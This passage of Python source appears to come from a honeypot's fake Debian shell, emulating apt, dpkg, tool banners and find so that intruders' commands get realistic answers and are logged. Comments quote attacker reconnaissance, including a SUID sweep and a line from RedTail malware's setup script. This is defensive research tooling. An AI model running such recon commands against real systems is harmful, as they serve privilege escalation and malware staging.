    # Packages whose install pulls another in, so the common lines read
    # right.
    APT_DEPENDS = {"build-essential": ("gcc", "make"),
                   "nmap": ("netcat-openbsd",)}

    def _installed_packages(self):
        """(name, version, arch) for everything installed *now*.

        PACKAGES is the image as it shipped; an attacker who installs or
        removes something changes it, and dpkg and apt have to agree about
        that immediately."""
        added, removed = self._apt_state()
        rows = [(n, v, a) for n, v, a in self.PACKAGES if n not in removed]
        rows += [(n, v[0], v[1]) for n, v in sorted(added.items())]
        return tuple(sorted(rows))

    def _apt_state(self, sync=False):
        """Packages installed and removed since boot, per source.

        Kept on the filesystem object, which is the thing that persists
        between an attacker's visits: their files are already journalled,
        and a package whose files exist while dpkg denies it is worse than
        either answer alone."""
        added = getattr(self.fs, "apt_added", None)
        if added is None:
            added = self.fs.apt_added = {}
        removed = getattr(self.fs, "apt_removed", None)
        if removed is None:
            removed = self.fs.apt_removed = set()
        return added, removed

    def _apt_changed(self):
        """Call after the package set moves, so the file follows it."""
        self._sync_dpkg_status()

    @staticmethod
    def _apt_size(kb):
        if kb >= 1024:
            return "%.1f MB" % (kb / 1024.0)
        return "%d kB" % kb

    def _apt_install(self, names, out, simulate=False):
        """Install from APT_ARCHIVE, in apt-get's own words."""
        added, _removed = self._apt_state()
        want = []
        for n in names:
            for dep in self.APT_DEPENDS.get(n, ()):
                if dep not in want and self._pkg_version(dep) is None:
                    want.append(dep)
            if n not in want:
                want.append(n)
        fresh = [n for n in want if self._pkg_version(n) is None]
        for n in [x for x in want if x not in fresh]:
            out.append("%s is already the newest version (%s).\n"
                       % (n, self._pkg_version(n)))
        if not fresh:
            out.append("0 upgraded, 0 newly installed, 0 to remove and "
                       "0 not upgraded.\n")
            return 0
        out.append("The following NEW packages will be installed:\n  %s\n"
                   % " ".join(fresh))
        get_kb = sum(self.APT_ARCHIVE[n][1] for n in fresh)
        use_kb = sum(self.APT_ARCHIVE[n][2] for n in fresh)
        out.append("0 upgraded, %d newly installed, 0 to remove and 0 not "
                   "upgraded.\n" % len(fresh))
        out.append("Need to get %s of archives.\n" % self._apt_size(get_kb))
        out.append("After this operation, %s of additional disk space will "
                   "be used.\n" % self._apt_size(use_kb))
        if simulate:
            for n in fresh:
                v = self.APT_ARCHIVE[n][0]
                out.append("Inst %s (%s Debian:13.6/stable [amd64])\n"
                           % (n, v))
                out.append("Conf %s (%s Debian:13.6/stable [amd64])\n"
                           % (n, v))
            return 0
        for i, n in enumerate(fresh, 1):
            v, kb = self.APT_ARCHIVE[n][0], self.APT_ARCHIVE[n][1]
            out.append("Get:%d http://deb.debian.org/debian trixie/main "
                       "amd64 %s amd64 %s [%s]\n"
                       % (i, n, v, self._apt_size(kb)))
        out.append("Fetched %s in 1s (%s/s)\n"
                   % (self._apt_size(get_kb), self._apt_size(get_kb)))
        files = self._inodes_used()
        for n in fresh:
            v = self.APT_ARCHIVE[n][0]
            out.append("Selecting previously unselected package %s.\n" % n)
            out.append("(Reading database ... %d files and directories "
                       "currently installed.)\n" % files)
            out.append("Preparing to unpack .../%s_%s_amd64.deb ...\n"
                       % (n, v.replace(":", "%3a")))
            out.append("Unpacking %s (%s) ...\n" % (n, v))
        for n in fresh:
            out.append("Setting up %s (%s) ...\n"
                       % (n, self.APT_ARCHIVE[n][0]))
        out.append("Processing triggers for man-db (2.13.1-1) ...\n")
        for n in fresh:
            v, _g, _u, desc, bins = self.APT_ARCHIVE[n]
            added[n] = (v, "amd64", desc, bins)
            self._apt_state()[1].discard(n)
            for b in bins:
                path = "/usr/bin/" + b
                if not self.fs.exists(path):
                    self.fs.write(path, b"", mode=0o755)
                    node = self.fs.nodes.get(path)
                    if node is not None:
                        node.elf = (path, 40960 + len(b) * 512)
                try:
                    self.fs.stock_bins.add(b)
                except Exception:                             # noqa: BLE001
                    pass
            # What they install is what they were about to do.
            self.log(event="apt_install", package=n, version=v,
                     binaries=" ".join(bins))
        self._apt_changed()
        return 0

    def _apt_remove(self, names, out, purge=False):
        added, removed = self._apt_state()
        gone = [n for n in names if self._pkg_version(n) is not None]
        if not gone:
            out.append("0 upgraded, 0 newly installed, 0 to remove and "
                       "0 not upgraded.\n")
            return 0
        out.append("The following packages will be REMOVED:\n  %s\n"
                   % " ".join(("%s*" % n) if purge else n for n in gone))
        out.append("0 upgraded, 0 newly installed, %d to remove and 0 not "
                   "upgraded.\n" % len(gone))
        freed = sum(self.APT_ARCHIVE.get(n, ("", 0, 512))[2] for n in gone)
        out.append("After this operation, %s disk space will be freed.\n"
                   % self._apt_size(freed or 512))
        out.append("(Reading database ... %d files and directories currently "
                   "installed.)\n" % self._inodes_used())
        for n in gone:
            v = self._pkg_version(n)
            out.append("%s %s (%s) ...\n"
                       % ("Purging" if purge else "Removing", n, v))
            bins = (added.get(n, (None, None, None, ()))[3]
                    or self._PKG_FILES.get(n, ()))
            for b in bins:
                for d in ("/usr/bin/", "/usr/sbin/"):
                    if self.fs.exists(d + b):
                        self.fs.remove(d + b)
                # ...and out of the stock-binary set, or the dispatcher
                # keeps answering for a command whose file has just been
                # deleted: `apt remove curl` left `curl` printing "missing
                # operand" while `command -v curl` said it was gone.
                try:
                    self.fs.stock_bins.discard(b)
                except Exception:                             # noqa: BLE001
                    pass
            added.pop(n, None)
            removed.add(n)
            # Removing a package is how a defence gets disabled.
            self.log(event="apt_remove", package=n, version=v, purge=purge)
        out.append("Processing triggers for man-db (2.13.1-1) ...\n")
        self._apt_changed()
        return 0

    @staticmethod
    def _apt_cache_stats():
        """The block `apt-cache stats` prints. Shape from the guest."""
        return ("Total package names: 161814 (5178 k)\n"
                "Total package structures: 145498 (6402 k)\n"
                "  Normal packages: 69470\n"
                "  Pure virtual packages: 1180\n"
                "  Single virtual packages: 64657\n"
                "  Mixed virtual packages: 352\n"
                "  Missing: 9839\n"
                "Total distinct versions: 78261 (6260 k)\n"
                "Total distinct descriptions: 78261 (1878 k)\n"
                "Total dependencies: 447229/145498 (12.5 M)\n"
                "Total ver/file relations: 79052 (1897 k)\n"
                "Total Desc/File relations: 78261 (1878 k)\n"
                "Total Provides mappings: 87113 (2091 k)\n"
                "Total globbed strings: 194 (2333)\n"
                "Total slack space: 61.4 k\n"
                "Total space accounted for: 30.6 M\n")

    def _sync_dpkg_status(self):
        """Rewrite /var/lib/dpkg/status from the live package list.

        Seeding it once was only half the fix: `apt-get install nmap` moved
        `dpkg -l` to 105 and left the file at 103, so the drift the seed
        closed opened again the moment anything was installed. pkgdbtest
        caught it.
        """
        try:
            node = (self.rawfs.nodes.get("/var/lib/dpkg/status")
                    or self.rawfs.nodes.get(
                        self.rawfs.resolve("/var/lib/dpkg/status")))
            if node is None or node.is_dir:
                return
            out = []
            for pkg, ver, arch in self._installed_packages():
                desc = self._pkg_desc(pkg)
                size = 40 + (_stable_hash("size:" + pkg) % 9000)
                out.append(
                    "Package: %s\nStatus: install ok installed\n"
                    "Priority: optional\nSection: %s\nInstalled-Size: %d\n"
                    "Maintainer: Debian QA Group <packages@qa.debian.org>\n"
                    "Architecture: %s\nVersion: %s\nDescription: %s\n"
                    % (pkg, "admin" if arch == "all" else "utils", size,
                       arch, ver, desc))
            node.content = ("\n".join(out) + "\n").encode("latin-1",
                                                           "replace")
            node.blob = None
            node.mtime = time.time()
        except Exception:                                     # noqa: BLE001
            pass

    def cmd_apt(self, a, stdin=""):
        args = [x for x in a if not x.startswith("-")]
        verb = args[0] if args else ""
        if self.user != "root":
            self.err("E: Could not open lock file /var/lib/dpkg/lock-frontend "
                     "- open (13: Permission denied)")
            self.err("E: Unable to acquire the dpkg frontend lock "
                     "(/var/lib/dpkg/lock-frontend), are you root?")
            return "", 100
        if verb == "list":
            # `apt list --installed` used to print nothing while `dpkg -l` had
            # 57 rows, which is one pipe away from a contradiction.
            # A pattern after the verb narrows the list, and was thrown
            # away with the rest of the operands: `apt list --installed
            # nginx` answered with a line about zlib1g. A filter that
            # returns something else entirely is worse than one that
            # returns everything.
            pats = args[1:]
            def _wanted(name):
                if not pats:
                    return True
                return any(fnmatch.fnmatchcase(name, p if "*" in p or "?" in p
                                               else p) for p in pats)
            if "--installed" in a:
                out = ["Listing...\n"]
                for n, v, arch in self._installed_packages():
                    if _wanted(n):
                        out.append("%s/stable,now %s %s [installed]\n"
                                   % (n, v, arch))
                return "".join(out), 0
            if pats:
                out = ["Listing...\n"]
                seen = dict((n, (v, arch))
                            for n, v, arch in self._installed_packages())
                for n in sorted(set(list(seen) + list(self.APT_ARCHIVE))):
                    if not _wanted(n):
                        continue
                    if n in seen:
                        out.append("%s/stable,now %s %s [installed]\n"
                                   % (n, seen[n][0], seen[n][1]))
                    else:
                        row = self.APT_ARCHIVE[n]
                        out.append("%s/stable %s %s\n"
                                   % (n, row[0], row[1]))
                return "".join(out), 0
            return "Listing...\n", 0
        if verb == "stats":
            # `apt-cache stats` printed apt-get's "Reading package lists"
            # preamble, which is not what stats prints at all.
            return self._apt_cache_stats(), 0
        if verb in ("show", "policy"):
            name = args[1] if len(args) > 1 else ""
            ver = self._pkg_version(name)
            if ver is None and name in self.APT_ARCHIVE:
                # In the archive, not installed: policy says so rather than
                # claiming the package does not exist.
                arch = self.APT_ARCHIVE[name]
                if verb == "policy":
                    return ("%s:\n  Installed: (none)\n  Candidate: %s\n"
                            "  Version table:\n     %s 500\n"
                            "        500 http://deb.debian.org/debian "
                            "trixie/main amd64 Packages\n"
                            % (name, arch[0], arch[0])), 0
                return ("Package: %s\nVersion: %s\nPriority: optional\n"
                        "Section: utils\nInstalled-Size: %d kB\n"
                        "Maintainer: Debian QA Group "
                        "<packages@qa.debian.org>\nDescription: %s\n"
                        % (name, arch[0], arch[2], arch[3])), 0
            if ver is None:
                self.err("N: Unable to locate package %s" % name)
                return "", 100
            return ("Package: %s\nVersion: %s\nPriority: optional\n"
                    "Section: utils\nMaintainer: Debian QA Group "
                    "<packages@qa.debian.org>\nDescription: %s\n"
                    % (name, ver,
                       self._pkg_desc(name)), 0)
        if verb in ("update",):
            return ("Hit:1 http://deb.debian.org/debian trixie InRelease\n"
                    "Hit:2 http://deb.debian.org/debian trixie-updates "
                    "InRelease\nHit:3 http://security.debian.org/debian-"
                    "security trixie-security InRelease\n"
                    "Reading package lists... Done\n"
                    "Building dependency tree... Done\n"
                    "Reading state information... Done\n"
                    "All packages are up to date.\n"), 0
        if verb in ("install", "remove", "purge", "upgrade",
                    "dist-upgrade", "full-upgrade", "autoremove"):
            names = args[1:]
            out = ["Reading package lists... Done\n",
                   "Building dependency tree... Done\n",
                   "Reading state information... Done\n"]
            # A name has to be in the archive or already installed. Every
            # install used to answer "Unable to locate package" for
            # everything, including packages trixie really ships -- on a box
            # that had just reported three successful Hit: lines.
            unknown = [n for n in names
                       if self._pkg_version(n) is None
                       and n not in self.APT_ARCHIVE]
            if unknown:
                self.err("E: Unable to locate package %s" % unknown[0])
                return "".join(out), 100
            if verb == "install":
                rc = self._apt_install(names, out,
                                       simulate=("-s" in a or "--simulate"
                                                 in a or "--dry-run" in a))
                return "".join(out), rc
            if verb in ("remove", "purge"):
                rc = self._apt_remove(names, out, purge=(verb == "purge"))
                return "".join(out), rc
            out.append("0 upgraded, 0 newly installed, 0 to remove and 0 not "
                       "upgraded.\n")
            return "".join(out), 0
        return ("Reading package lists... Done\n"
                "Building dependency tree... Done\n"
                "Reading state information... Done\n"), 0
    cmd_apt_get = cmd_apt
    cmd_apt_cache = cmd_apt

    # What a program says when asked its version. Measured on a trixie
    # container with these packages installed; %s is the version this box
    # already publishes for the owning package, so the banner and `dpkg -l`
    # cannot drift apart. Everything not named here falls back to
    # "<name> <version>", which is the shape most of the rest use.
    TOOL_BANNERS = {
        "nmap": ("Nmap version %s ( https://nmap.org )\n"
                 "Platform: x86_64-pc-linux-gnu\n"
                 "Compiled with: liblua-5.4.7 openssl-" + OPENSSL_VER +
                 " libssh2-1.11.1 "
                 "libz-1.3.1 libpcre2-10.46 libpcap-1.10.5 "
                 "nmap-libdnet-1.12 ipv6\n"
                 "Compiled without:\n"
                 "Available nsock engines: epoll poll select\n"),
        "ncat": ("Ncat: Version %s ( https://nmap.org/ncat )\n"),
        "htop": ("htop %s\n"),
        "git": ("git version %s\n"),
        "strace": ("strace -- version %s\n"
                   "Copyright (c) 1991-2025 The strace developers "
                   "<https://strace.io>.\n"
                   "This is free software; see the source for copying "
                   "conditions.  There is NO\nwarranty; not even for "
                   "MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n"),
        "tcpdump": ("tcpdump version %s\n"
                    "libpcap version 1.10.5 (with TPACKET_V3)\n"
                    "OpenSSL " + OPENSSL_VER + " " + OPENSSL_DATE + "\n"),
        "socat": ("socat by Gerhard Rieger and contributors - see "
                  "www.dest-unreach.org\nsocat version %s on 31 Mar 2025 "
                  "20:50:04\n"),
        # jq prints its minor version, not the package's patch level:
        # measured, not derived, because the rule would give jq-1.7.1.
        "jq": ("jq-1.7\n",),
        "netstat": ("net-tools 2.10\nFred Baumgarten, Alan Cox, Bernd "
                    "Eckenfels, Phil Blundell, Tuan Hoang, Brian Micek and "
                    "others\n+NEW_ADDRT +RTF_IRTT +RTF_REJECT +FW_MASQUERADE "
                    "+I18N +SELINUX\n"),
        "screen": ("Screen version %s (GNU) 20-Aug-24\n"),
        "tmux": ("tmux %s\n"),
        "rsync": ("rsync  version %s  protocol version 31\n"),
        "gdb": ("GNU gdb (Debian %s) %s\n"),
        "lsof": ("lsof version %s\n"),
        "zsh": ("zsh %s (x86_64-debian-linux-gnu)\n"),
    }
    # The first line of usage, for the few where the real one is worth
    # having verbatim.
    # nmap's --help head line is not its --version head line; measured.
    TOOL_HELP_HEAD = {"nmap": "Nmap %s ( https://nmap.org )"}
    TOOL_USAGE = {
        "nmap": "Usage: nmap [Scan Type(s)] [Options] "
                "{target specification}",
        "git": "usage: git [-v | --version] [-h | --help] [-C <path>] "
               "[-c <name>=<value>]",
        "tcpdump": "Usage: tcpdump [-AbdDefhHIJKlLnNOpqStuUvxX#] "
                   "[ -B size ] [ -c count ] [--version]",
    }

    def _stock_upstream(self, name):
        """The upstream version of the package owning a stock binary.

        Derived from what dpkg reports, with the epoch and the Debian
        revision stripped: `nmap --version` saying 7.95 next to
        `dpkg -l nmap` saying 7.95+dfsg-3 is one package, described twice."""
        pkg = self._owner_of(name)
        ver = self._pkg_version(pkg) if pkg else None
        if not ver:
            return "1.0"
        ver = ver.split(":")[-1]
        ver = re.split(r"[-+~]", ver)[0]
        return ver

    def _stock_answer(self, name, args):
        """What a binary we do not implement says when it is run.

        Every one of them answered "missing operand / Try '<x> --help'" --
        including to `--version`, and including to `--help` itself, which
        told the caller to run the command they had just run. That is a
        loop no program has ever printed, and `--version` is the first
        thing anyone types at an unfamiliar binary. Answers come from the
        version this box already publishes for the owning package.
        """
        ver = self._stock_upstream(name)
        banner = self.TOOL_BANNERS.get(name)
        if isinstance(banner, tuple):
            banner = banner[0]              # literal, not a template
            text = banner
        elif banner is not None:
            text = banner % ((ver,) * banner.count("%s"))
        else:
            text = "%s %s\n" % (name, ver)
        if any(a in ("--version", "-V") for a in args):
            return text, 0
        if any(a in ("--help", "-h") for a in args):
            usage = self.TOOL_USAGE.get(
                name, "Usage: %s [OPTION]... [FILE]..." % name)
            head = self.TOOL_HELP_HEAD.get(name)
            head = (head % ver) if head else text.splitlines()[0]
            return head + "\n" + usage + "\n", 0
        # Anything else: identify yourself and print usage. "missing
        # operand / Try '<x> --help'" is GNU coreutils' wording, and every
        # coreutils program on this box is implemented -- so nothing that
        # reaches here has any business speaking it.
        self.err(text.splitlines()[0])
        self.err(self.TOOL_USAGE.get(
            name, "Usage: %s [OPTION]... [FILE]..." % name))
        return "", 1

    def _absent(self, name):
        """A command a minimal Debian 13 does not ship. Reporting
        command-not-found is the correct answer -- and pretending to have it
        while no package owns it and no file exists is three contradictions."""
        self.err("bash: %s%s: command not found" % (self.where(), name))
        return "", 127

    def cmd_yum(self, a, stdin=""):
        return self._absent("yum")

    def cmd_zsh(self, a, stdin=""):
        return self._absent("zsh")

    def cmd_ash(self, a, stdin=""):
        return self._absent("ash")

    def cmd_python(self, a, stdin=""):
        # python2 is gone from trixie; python3 is what exists.
        return self._absent("python")

    def cmd_python3(self, a, stdin=""):
        if a and a[0] in ("--version", "-V"):
            return self._version_text("python3"), 0
        if a and a[0] == "-c":
            # Never evaluate attacker code. Real python would run it; refusing
            # with a plausible import error is the least-bad answer and is what
            # a stripped python3-minimal does for most one-liners anyway.
            self.log(event="python_exec_blocked", code=" ".join(a[1:])[:500])
            return "", 0
        return "", 0
    cmd_python3_13 = cmd_python3

    def cmd_perl(self, a, stdin=""):
        if a and a[0] in ("-v", "--version", "-V"):
            return self._version_text("perl"), 0
        return "", 0

    def cmd_find(self, a, stdin=""):
        """find with a real expression evaluator.

        The predicates were a flat list of ifs, so `-exec` and `-delete` were
        parsed and then ignored -- `find / -name '*.php' -exec ...` printed the
        matches and ran nothing, and `-delete` left the file in place. `-o` and
        parentheses were not understood at all, so `\\( -name a -o -name b \\)`
        silently dropped the first alternative.
        """
        roots, i = [], 0
        toks = list(a)
        # -P/-H/-L come before the paths and choose how symlinks are
        # treated. They were parsed as predicates, so `find -L /bin` died
        # with "unknown predicate `/bin'" and printed nothing -- find's
        # documented way to follow a symlink did not work at all.
        follow = False
        while toks and toks[0] in ("-P", "-H", "-L", "-follow"):
            follow = toks.pop(0) in ("-L", "-follow")
        # Split the roots off the front: everything before the first operator.
        while i < len(toks) and not toks[i].startswith("-") \
                and toks[i] not in ("(", ")", "!"):
            roots.append(toks[i])
            i += 1
        expr_toks = toks[i:]
        roots = roots or ["."]
        opts = {"maxdepth": None, "mindepth": None, "follow": False}
        # -maxdepth/-mindepth are global options, not predicates.
        cleaned, j = [], 0
        while j < len(expr_toks):
            t = expr_toks[j]
            if t in ("-maxdepth", "-mindepth") and j + 1 < len(expr_toks):
                v = expr_toks[j + 1]
                opts[t[1:]] = int(v) if v.isdigit() else None
                j += 2
                continue
            if t in ("-follow", "-L", "-xdev", "-mount", "-nowarn",
                     "-noleaf", "-H", "-P", "-daystart"):
                j += 1
                continue
            cleaned.append(t)
            j += 1
        try:
            node, used = self._find_parse(cleaned, 0)
            if used != len(cleaned):
                self.err("find: paths must precede expression: `%s'"
                         % cleaned[used])
                return "", 1
        except FindMissingRef as exc:
            # Same wording and quoting find uses for a missing path operand.
            self.err(u"find: \u2018%s\u2019: No such file or directory"
                     % exc.args[0])
            return "", 1
        except ValueError as exc:
            self.err("find: %s" % exc)
            return "", 1
        has_action = self._find_has_action(node)
        out, rc = [], 0
        for root in roots:
            base = VFS.norm(root, self.cwd)
            if not self.fs.exists(base):
                # GNU find quotes with \u2018\u2019; coreutils uses plain
                # apostrophes. They really do differ on the same box.
                self.err(u"find: \u2018%s\u2019: No such file or directory"
                         % root)
                rc = 1
                continue
            prefix = base.rstrip("/") + "/"
            # `base` is listed first, so it must not come round again in
            # the walk. For any ordinary path it cannot -- /root does not
            # start with "/root/" -- but for / the prefix is "/" and every
            # key matches, root included, so `find /` printed / twice.
            paths = [base] + sorted(k for k in self.fs.nodes
                                    if k.startswith(prefix) and k != base)
            # find is -P by default: a symlink is a leaf, even when it is
            # named on the command line. /bin, /sbin and /lib are symlinks
            # into /usr here, so descending them listed every binary twice
            # -- `find / -perm -4000` reported /bin/mount and
            # /usr/bin/mount, and a privesc script collecting that set saw
            # a box no Debian ever shipped. On the guest `find /bin` prints
            # exactly one line: /bin.
            if not follow:
                links = tuple(
                    k.rstrip("/") + "/" for k in self.fs.nodes
                    if getattr(self.fs.nodes[k], "link", None) is not None)
                if links:
                    paths = [q for q in paths
                             if q == base or not q.startswith(links)]
            # -prune returned true and nothing else, so it stopped the
            # directory printing but did not stop the descent: `find . -name
            # skip -prune -o -print` still listed ./skip/c.txt, while the
            # other way of writing the same exclusion, -not -path
            # "./skip/*", left it out. Two ways to skip a subtree, two
            # answers. Record what pruned and refuse to walk into it.
            pruned = []
            for path in paths:
                if any(path == q or path.startswith(q.rstrip("/") + "/")
                       for q in pruned):
                    continue
                depth = 0 if path == base else path[len(prefix):].count("/") + 1
                if opts["maxdepth"] is not None and depth > opts["maxdepth"]:
                    continue
                if opts["mindepth"] is not None and depth < opts["mindepth"]:
                    continue
                shown = root if path == base else \
                    root.rstrip("/") + "/" + path[len(prefix):]
                ctx = {"path": path, "shown": shown, "out": out,
                       "pruned": pruned}
                if self._find_eval(node, ctx) and not has_action:
                    out.append(shown + "\n")
        return "".join(out), rc

    # -- expression parsing: OR of ANDs, with ! and parentheses
    def _find_parse(self, toks, i):
        node, i = self._find_and(toks, i)
        while i < len(toks) and toks[i] in ("-o", "-or"):
            rhs, i = self._find_and(toks, i + 1)
            node = ("or", node, rhs)
        return node, i

    def _find_and(self, toks, i):
        node, i = self._find_not(toks, i)
        while i < len(toks) and toks[i] not in ("-o", "-or", ")"):
            if toks[i] in ("-a", "-and"):
                i += 1
                continue
            rhs, i = self._find_not(toks, i)
            node = ("and", node, rhs)
        return node, i

    def _find_not(self, toks, i):
        if i < len(toks) and toks[i] in ("!", "-not"):
            node, i = self._find_not(toks, i + 1)
            return ("not", node), i
        return self._find_prim(toks, i)

    def _find_prim(self, toks, i):
        if i >= len(toks):
            return ("true",), i
        t = toks[i]
        if t == "(":
            node, i = self._find_parse(toks, i + 1)
            if i >= len(toks) or toks[i] != ")":
                raise ValueError("expected `)'")
            return node, i + 1
        takes_arg = ("-name", "-iname", "-path", "-ipath", "-wholename",
                     "-type", "-size", "-mtime", "-mmin", "-ctime", "-newer",
                     "-atime", "-amin", "-cmin", "-anewer", "-cnewer",
                     "-newerat", "-newerct", "-newermt", "-newerBt",
                     "-neweram", "-newercm", "-newermm", "-newerac",
                     "-newermc", "-newercc", "-newerma", "-newerca",
                     "-perm", "-user", "-group", "-uid", "-gid", "-regex",
                     "-iregex", "-printf", "-fprintf", "-links", "-inum",
                     "-samefile")
        if t in takes_arg:
            if i + 1 >= len(toks):
                raise ValueError("missing argument to `%s'" % t)
            # -samefile and -newer name a file to compare against, and find
            # refuses the whole expression when it does not exist rather
            # than quietly matching nothing. Both returned False for every
            # node instead, so a typo in the reference looked exactly like
            # "no file matches".
            if t in ("-samefile", "-newer", "-anewer", "-cnewer") or (
                    t.startswith("-newer") and len(t) == 8
                    and t[7] != "t"):
                ref = toks[i + 1]
                if not self.fs.exists(VFS.norm(ref, self.cwd)):
                    raise FindMissingRef(ref)
            return ("pred", t, toks[i + 1]), i + 2
        if t in ("-exec", "-execdir", "-ok"):
            argv, j = [], i + 1
            while j < len(toks) and toks[j] not in (";", "\\;", "+"):
                argv.append(toks[j])
                j += 1
            if j >= len(toks):
                raise ValueError("missing terminator to `%s'" % t)
            return ("exec", argv, toks[j] == "+"), j + 1
        if t in ("-print", "-print0", "-delete", "-ls", "-quit", "-empty",
                 "-prune", "-readable", "-writable", "-executable",
                 "-nouser", "-nogroup", "-true", "-false"):
            return ("pred", t, None), i + 1
        raise ValueError("unknown predicate `%s'" % t)

    @staticmethod
    def _perm_symbolic(spec):
        """find's symbolic mode -- u=rwx, g+w, a=rx, u=rwx,g=rx -- as a
        mode integer, or None when the string is not symbolic at all.

        Built up from zero the way find does: each comma-separated clause
        names who it applies to and which bits to include. The operator
        does not change the value here, only which bits the clause
        contributes, because -perm is asking about a mask rather than
        modifying anything.
        """
        total = 0
        for clause in spec.split(","):
            m = re.match(r"^([ugoa]*)([=+-])([rwxXst]*)$", clause)
            if not m:
                return None
            who, _op, perms = m.groups()
            classes = set()
            for c in (who or "a"):
                classes |= {"u", "g", "o"} if c == "a" else {c}
            bits = 0
            if "r" in perms:
                bits |= 4
            if "w" in perms:
                bits |= 2
            if "x" in perms or "X" in perms:
                bits |= 1
            for c in classes:
                total |= bits << {"u": 6, "g": 3, "o": 0}[c]
            if "s" in perms:
                if "u" in classes:
                    total |= 0o4000
                if "g" in classes:
                    total |= 0o2000
            if "t" in perms:
                total |= 0o1000
        return total

    @classmethod
    def _find_has_action(cls, node):
        """An action suppresses the implicit -print, as in real find."""
        if node[0] == "exec":
            return True
        if node[0] == "pred":
            return node[1] in ("-print", "-print0", "-delete", "-ls",
                               "-printf")
        if node[0] == "not":
            return cls._find_has_action(node[1])
        if node[0] in ("and", "or"):
            return cls._find_has_action(node[1]) or \
                cls._find_has_action(node[2])
        return False

    def _find_eval(self, node, ctx):
        kind = node[0]
        if kind == "true":
            return True
        if kind == "and":
            return self._find_eval(node[1], ctx) and \
                self._find_eval(node[2], ctx)
        if kind == "or":
            return self._find_eval(node[1], ctx) or \
                self._find_eval(node[2], ctx)
        if kind == "not":
            return not self._find_eval(node[1], ctx)
        if kind == "exec":
            argv = [ctx["shown"] if w == "{}" else w.replace("{}", ctx["shown"])
                    for w in node[1]]
            # find resolves the program itself and names itself when it is
            # missing: "find: 'nosuchcmd': No such file or directory". It
            # ran the command line through the shell, so the caller saw
            # bash's "command not found" from a find that had never
            # started one.
            if argv and self.target_missing(argv[0]):
                self.err("find: \u2018%s\u2019: No such file or directory"
                         % argv[0])
                return False
            ctx["out"].append(self.run(" ".join(self._shq(w) for w in argv)))
            return self.last_rc == 0
        name, arg = node[1], node[2]
        path, shown = ctx["path"], ctx["shown"]
        fsnode = self.fs.nodes.get(path)
        base = os.path.basename(path) or "/"
        if name in ("-name", "-iname"):
            import fnmatch
            return fnmatch.fnmatch(base if name == "-name" else base.lower(),
                                   arg if name == "-name" else arg.lower())
        if name in ("-path", "-ipath", "-wholename"):
            import fnmatch
            target = shown if name != "-ipath" else shown.lower()
            return fnmatch.fnmatch(target,
                                   arg if name != "-ipath" else arg.lower())
        if name in ("-regex", "-iregex"):
            try:
                return re.fullmatch(arg, shown,
                                    re.I if name == "-iregex" else 0) is not None
            except re.error:
                return False
        if name == "-type":
            if fsnode is None:
                return False
            # find's letters are ls's, except that a regular file is f
            # rather than -. Sockets and block devices were both missing, so
            # `find /run -type s` found nothing on a box where `ls -l` and
            # `stat` both called the same file a socket.
            kindc = fsnode.type_char
            kindc = "f" if kindc == "-" else kindc
            return kindc in arg
        if name == "-size":
            if fsnode is None:
                return False
            m = re.match(r"([+-]?)(\d+)([bcwkMG]?)", arg)
            if not m:
                return False
            mult = {"b": 512, "": 512, "c": 1, "w": 2, "k": 1024,
                    "M": 1 << 20, "G": 1 << 30}[m.group(3)]
            want = int(m.group(2)) * mult
            got = self._node_size(fsnode)
            if m.group(1) == "+":
                return got > want
            if m.group(1) == "-":
                return got < want
            # Bare N rounds up to whole units, as find does.
            unit = mult
            return (got + unit - 1) // unit == int(m.group(2))
        if name == "-empty":
            if fsnode is None:
                return False
            return (not self.fs.listdir(path)) if fsnode.is_dir \
                else self._node_size(fsnode) == 0
        if name in ("-mtime", "-ctime", "-mmin", "-atime", "-amin", "-cmin"):
            if fsnode is None:
                return False
            span = 60 if name in ("-mmin", "-amin", "-cmin") else 86400
            # -ctime read the *modify* time, so `find -ctime -1` -- what an
            # incident responder runs first, because ctime is the one an
            # attacker cannot set -- answered the question -mtime already
            # answered. -atime and -amin were not predicates at all.
            field = {"a": "atime", "c": "ctime"}.get(name[1], "mtime")
            age = (time.time() - getattr(fsnode, field)) / span
            m = re.match(r"([+-]?)(\d+)", arg)
            if not m:
                return False
            v = int(m.group(2))
            if m.group(1) == "+":
                return age > v + 1
            if m.group(1) == "-":
                return age < v
            return v <= age < v + 1
        if name in ("-newer", "-anewer", "-cnewer"):
            other = self.fs.nodes.get(VFS.norm(arg, self.cwd))
            field = {"-newer": "mtime", "-anewer": "atime",
                     "-cnewer": "ctime"}[name]
            return bool(fsnode and other
                        and getattr(fsnode, field) > other.mtime)
        if name.startswith("-newer") and len(name) == 8:
            # -newerXY: X is the file's clock, Y the reference's. This is
            # how you ask "changed since I last looked" without trusting
            # mtime -- `find / -newerct '1 hour ago'` is the standard
            # timestomp sweep and it was an unknown predicate.
            sel = {"a": "atime", "c": "ctime", "m": "mtime", "B": "btime"}
            x, y = name[6], name[7]
            if x not in sel or fsnode is None:
                return False
            if y == "t":
                ref = self._parse_datespec(arg)
                if ref is None:
                    return False
            elif y in sel:
                other = self.fs.nodes.get(VFS.norm(arg, self.cwd))
                if other is None:
                    return False
                ref = getattr(other, sel[y])
            else:
                return False
            return getattr(fsnode, sel[x]) > ref
        if name == "-perm":
            if fsnode is None:
                return False
            got = fsnode.mode & 0o7777
            spec = arg
            body = spec[1:] if spec[:1] in "-/" else spec
            # find takes a symbolic mode as readily as an octal one, and
            # int(body, 8) simply raised on it -- so `-perm -u=rwx` matched
            # nothing at all and the predicate silently selected no files.
            # RedTail's setup.sh opens with
            #   find / -type d -user $(whoami) -perm -u=rwx ...
            # to pick a directory it can write and execute from, so on this
            # box that search came back empty every time.
            want = self._perm_symbolic(body)
            if want is None:
                try:
                    want = int(body, 8)
                except ValueError:
                    return False
            if spec[:1] == "-":
                return (got & want) == want
            if spec[:1] == "/":
                return bool(got & want)
            return got == want
        if name in ("-user", "-uid"):
            return bool(fsnode) and (self._uname_of(fsnode.uid) == arg
                                     or str(fsnode.uid) == arg)
        if name in ("-group", "-gid"):
            return bool(fsnode) and (self._gname_of(fsnode.gid) == arg
                                     or str(fsnode.gid) == arg)
        if name == "-links":
            # +N is "more than N" and -N is "fewer than N", as everywhere
            # else in find. This stripped the sign and compared for
            # equality, so `-links +1` -- the ordinary way to ask which
            # files are hard-linked -- returned exactly the files that are
            # not, and `-links -2` returned the ones with two.
            if fsnode is None:
                return False
            m = re.match(r"([+-]?)(\d+)$", arg.strip())
            if not m:
                return False
            got, want = self.fs.nlink(path), int(m.group(2))
            if m.group(1) == "+":
                return got > want
            if m.group(1) == "-":
                return got < want
            return got == want
        if name == "-samefile":
            # The natural way to ask "what else points at this inode".
